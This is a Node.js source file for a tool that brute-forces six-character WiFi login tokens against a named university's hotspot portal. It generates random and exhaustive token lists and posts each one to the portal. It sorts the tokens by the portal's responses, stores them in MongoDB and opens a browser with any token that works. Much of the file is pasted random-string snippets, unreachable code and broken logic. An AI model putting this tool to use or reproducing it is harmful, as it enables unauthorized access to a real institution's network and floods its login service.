var express = require("express");
var qs = require("querystring");
var http = require("https");
var cors = require("cors");
var request = require("request");
var colors = require('colors');
var open = require('open');
var restful = require('node-restful');
var mongoose = require('mongoose');

var app = express();

mongoose.connect("mongodb://localhost:27017/wifi_tokens");

var Token = restful.model('wifi_tokens', new mongoose.Schema({
  token: {type: String, unique: true},
  status: String
}));

app.listen(5000, function(req, res) {
  console.log("server running on port 5000");
  // randomize();
  // s()
  // handlingDuplicate()
  // checkExistence('TWM2N6')
  // sendRequest('MC38W8')
  // rapidGeneration()
});

// enables cors
app.use(cors({
  'allowedHeaders': ['sessionId', 'Content-Type'],
  'exposedHeaders': ['sessionId'],
  'methods': 'GET,HEAD,PUT,PATCH,POST,DELETE',
}));

app.get("/", function(req, res) {
  res.sendFile(__dirname + "/randomToken.html");
});

Token.methods(['get', 'post', 'put', 'delete']);
Token.register(app, "/tokens");

app.get("/data", function(req, res) {
  var code = req.query.code;
  if (code !== "") {
    sendRequest(code);
  }
});

function s() {
  Token.find()
  .where({status: "exceeded"})
  .sort('token')
  .lean()
  .exec()
  .then(function(response) {
    // console.log(response.length)

    (async function() {
      for (var i = 0; i < response.length; i++) {
        var token = response[i].token;
        await sendRequest(token)
      }
    })()
  })
};

function handlingDuplicate() {
  Token.find()
  .where({status: "exceeded"})
  .sort('token')
  .limit(100000)
  .skip(400000)
  .lean()
  .exec()
  .then(function(response){
    // console.log(response.length);

    for (var i = 0; i < response.length; i++) {
      Token.find({"token": response[i].token}, function(err, res){
        if (res && res.length > 1) {
          console.log(res[1].token)
          res[1].remove()
          res[1].save()
        }
      })
    }

  })
};

// persistantLogin()

function persistantLogin() {
  for (var i = 0; i < 50; i++) {
    var options = { method: 'POST',
      url: 'https://hotspot.dwu.ac.pg/',
      headers: {
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded' },
      form: { 
        url: 'https://www.google.com.pg',
        ip: '192.168.4.22',
        code: "8BT7LR" 
      }
    };
    console.log("Sending request with token: " + options['form']['code']);
    var r = request.defaults({pool: {maxSockets: Infinity}});
      r(options, function(error, response, body) {
        if (error) console.log(error.error)
        console.log("send: " + i)
    })
  }
}

// Randomly generating 6-character token
function randomize(){
  // var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  // generate hundred random token
  console.log("Generating random token...")
  for (var i=0;i < 1;i++){
    var token = '';
    for (var i = 6; i > 0; --i) token += chars[Math.floor(Math.random() * chars.length)];
    validate(token);
  };
};

// Validate the token
async function validate(token){
  var letters = 0;
  var numbers = 0;

  console.log("Validating token: " + token);

  for (var i = 0; i < token.length; i++) {
    if (isNaN(token[i])) {
      letters++;
    } else {
      numbers++;
    }
  }

  // wifi token policy 
  // 6 codes consist of letters and numbers capitalized
  // code should atleast have 
  // 4 numbers, 2 letters
  // 3 numbers, 3 letters
  // 2 numbers, 4 letters
  // 2 letters, 4 numbers
  // 3 letters, 3 numbers
  // 4 letters, 2 numbers
  // 5 letters, 1 numbers
  if (letters == 0 && numbers == 6) {/*randomize();*/return;}
  if (letters == 1 && numbers == 5) {checkExistence(token);}
  if (letters == 2 && numbers == 4) {checkExistence(token);}
  if (letters == 3 && numbers == 3) {checkExistence(token);}
  if (letters == 4 && numbers == 2) {checkExistence(token);}
  if (letters == 5 && numbers == 1) {checkExistence(token);}
  if (letters == 6 && numbers == 0) {checkExistence(token);}
};

// Check if the generated token already exists
async function checkExistence(token) {
  Token.find({"token": token}).then(async function(res) {
    // if returns a match
    // randomize
    if (res && res.length) {
      console.log("Token: " + token + " already exists".red);
      // randomize();
      return;
    // otherwise sendRequest or saveToken
    } else {
      // saveToken(token, "checking"); randomize()
      await sendRequest(token); randomize()
    }
  })
};

// Saving token
async function saveToken(token, status, callback) {
  console.log("Saving: " + token)
  Token.find({token: token}).then(function(item) {
    if (item && item.length) {
      item[0].status = status;
      item[0].save(function(error, response){
        if (!error && response) {
          typeof callback == 'function' ? new callback() : null;
        }
      })
    } else {
      new Token({
        token: token,
        status: status
      }).save(function(error, response){
        if (!error && response) {
          typeof callback == 'function' ? new callback() : null;
        }
      })
    }
  })
};

// Make POST request to the server
function sendRequest(token) {
  var options = { method: 'POST',
    url: 'https://hotspot.dwu.ac.pg/',
    headers: {
      'cache-control': 'no-cache',
      'content-type': 'application/x-www-form-urlencoded' },
    form: { 
      url: 'https://www.google.com.pg',
      ip: '192.168.4.22',
      code: token 
    }
  };
  
  console.log("Sending request with token: " + token);
  
  var r = request.defaults({pool: {maxSockets: Infinity}});
  
  return new Promise(function(resolve, reject) {
    r(options, function(error, response, body) {
      if (error) reject(error.error)

      if (response && body) {
        resolve(handleRequest(body, token))
      }
    })
  })
};

// Works after checking the generated token
async function handleRequest(body, token) {
  if (body.toString().search("exceeded") > -1) {
    console.log("token exceeded".blue);
    saveToken(token, "exceeded");
  }
  if ((body.toString().search("Enter the login token") > -1) && (body.toString().search("Log In") > -1)) {
    console.log("login page");
  }
  if ((body.toString().search("Log In") > -1) && !(body.toString().search("Enter the login token") > -1)) {
    console.log(("Valid token: " + token + ". Please login to connect to internet.").green);
    await saveToken(token, "valid", function(){

      console.log(("Opening browser...").green);
      open("https://hotspot.dwu.ac.pg/?code="+token, "firefox", function(response) {
        if (response == null) {
          process.exit(1)
        }
      });

    });
  }
  if (body.toString().search("expired") > -1) {
    console.log("token expired".red);
    saveToken(token, "expired");
  }
  if (body.toString().search("not valid") > -1) {
    console.log(("invalid token: " + token).red);
    saveToken(token, "invalid")
  }
  if (body.toString().search("in use") > -1) {
    console.log(("valid token: " + token).red);
    saveToken(token, "valid")
  }
};

var c = [
  ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
  ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
  ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
  ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
  ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
  ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'],
];

async function permutate(abc, memo) {
  var options;
  memo = memo || abc.shift().slice(0);
  
  if(abc.length) {
    options = abc.shift();

    return await permutate(abc, memo.reduce(function(all, item){
      return all.concat(options.map(function(option){
        return option + item;
      }))
    }, []))        
  }

  return memo;
};

// console.log(permutate(c));

/**
 * This script randomly generates six alphanumeric characters
 */
function generate_random_wifi_token() {
  var token = [];
  var ticket = ["5GPGMN","NG1822","HMQ6DN","5D43G8"];
  var ipaddress = ["192.168.1.237","192.168.2.38","192.168.1.222"];
  var url = "";

  var alpha = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"];
  var num = ["1","2","3","4","5","6","7","8","9","0"];
  var pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  for (var i=0; i<6; i++) {
      var temp, temp1, temp2;
      token[i] = pool[Math.floor(Math.random() * pool.length)];
      if (token.contains == "2" && token.indexOf("2").length ) {}
      if (token.search()) {}
      token.toString().replace(",","");
  }

  return token;

  token = "f"+(Math.random()*(1<<81)).toString(24).replace(".","");
  // for (var i = 0; i < token.length; i++) {
    //a(token[i])
  // }

  validate(token)


  /**
   * If you only want to allow specific characters, you could also do it like this:
   */
  function randomString1(length, chars) {
      var result = '';
      for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
      return result;
  }
  var rString = randomString1(32, '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ');

  /**
   * Another way to do it could be to use a special string that tells the function what types of characters to use. You could do that like this:
   */
  function randomString2(length, chars) {
      var mask = '';
      if (chars.indexOf('a') > -1) mask += 'abcdefghijklmnopqrstuvwxyz';
      if (chars.indexOf('A') > -1) mask += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
      if (chars.indexOf('#') > -1) mask += '0123456789';
      if (chars.indexOf('!') > -1) mask += '~`!@#$%^&*()_+-={}[]:";\'<>?,./|\\';
      var result = '';
      for (var i = length; i > 0; --i) result += mask[Math.floor(Math.random() * mask.length)];
      return result;
  }

  console.log(randomString2(16, 'aA'));
  console.log(randomString2(32, '#aA'));
  console.log(randomString2(64, '#A!'));

  function rStr() {
      var s = Math.random().toString(36).slice(2);
      return s.length===16 ? s : rStr(); 
  }

  function randomString3(length) {
      return Math.round((Math.pow(36, length + 1) - Math.random() * Math.pow(36, length))).toString(36).slice(1);
  }

  var randomString4 = function (len, bits) {
      bits = bits || 36;
      var outStr = "", newStr;
      while (outStr.length < len)
      {
          newStr = Math.random().toString(bits).slice(2);
          outStr += newStr.slice(0, Math.min(newStr.length, (len - outStr.length)));
      }
      return outStr.toUpperCase();
  };
  
  randomString4(12, 16); // 12 hexadecimal characters
  randomString4(200); // 200 alphanumeric characters

  function randomNum(hi){
    return Math.floor(Math.random()*hi);
  } 
  function randomChar(){
    return String.fromCharCode(randomNum(100));
  }
  function randomString5(length){
    var str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for(var i = 0; i < length; ++i){
      str += randomChar();
    }
    return str;
  }
  var RandomString = randomString5(32); //32 length string

  function randomString6(len) {
    var p = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    return [...Array(len)].reduce(a=>a+p[~~(Math.random()*p.length)],'');
  }

  var randomString7 = function(length) {
    var str = '';
    var chars ='0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz'.split('');
    var charsLen = chars.length;
    if (!length) {
      length = ~~(Math.random() * charsLen);
    }
    for (var i = 0; i < length; i++) {
      str += chars[~~(Math.random() * charsLen)];
    }
    return str;
  };

  function randString(length) {
    var l = length > 25 ? 25 : length;
    var str = Math.random().toString(36).substr(2, l);
    if(str.length >= length){
      return str;
    }
    return str.concat(this.randString(length - str.length));
  };

  function test(){
    for(var x = 0; x < 300000; x++){
      if(randString(x).length != x){
        throw new Error('invalid result for len ' + x);
      }
    }
  };

  function keyGen(keyLength) {
    var i, key = "", characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    var charactersLength = characters.length;

    for (i = 0; i < keyLength; i++) {
        key += characters.substr(Math.floor((Math.random() * charactersLength) + 1), 1);
    }

    return key;
  };
  // keyGen(12);
};

// function ajax(token) {
//   var options = {
//     "method": "POST",
//     "hostname": "hotspot.dwu.ac.pg",
//     "port": null,
//     "path": "/",
//     "headers": {
//       "content-type": "application/x-www-form-urlencoded",
//       "cache-control": "no-cache"
//     }
//   };
  
//   var req = http.request(options, function (res) {
//     var chunks = [];
  
//     res.on("data", function (chunk) {
//       chunks.push(chunk);
//     });
  
//     res.on("end", function () {
//       var body = Buffer.concat(chunks);
//       console.log(body.toString());
//     });
//   });
  
//   req.write(qs.stringify({ 
//     url: 'https://www.google.com.pg',
//     ip: '192.168.2.247',
//     code: 'Y3140M' }));
//   req.end();
// };

// 0|0|0|0|0|0
// 0|0|0|0|0|1
// 0|0|0|0|1|0
function rapidGeneration() {
  var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  var length = chars.length;
  var num = [0,1,2,3,4,5,6,7,8,9];
  var arr = [0,0,0,0,0,0];
  var a = 0;
  for (var i = 0; i < length; i++) {
    arr[0] = chars[i]
    for (var j = 1; j < length; j++) {
      arr[1] = chars[j]
      for (var k = 2; k < length; k++) {
        arr[2] = chars[k];
        for (var l = 3; l < length; l++) {
          arr[3] = chars[l]
          for (var m = 4; m < length; m++) {
            arr[4] = chars[m]
            for (var n = 5; n < length; n++) {
              arr[5] = chars[n]
              if (isFinite(arr.join())) {
                a++;
                // Promise.resolve(validate(arr.join("")))
              } else if (a < 10) {
                a++;
                // Promise.resolve(validate(arr.join("")))
              } else {
                a = 1;
                // console.log(arr.join(""))
                // saveToken(arr.join(""))
                // setTimeout(function(){
                //   return Promise.resolve(validate(arr.join("")))
                // }, 3000)
              }
            }
          }
        }
      }
    }
  }
}


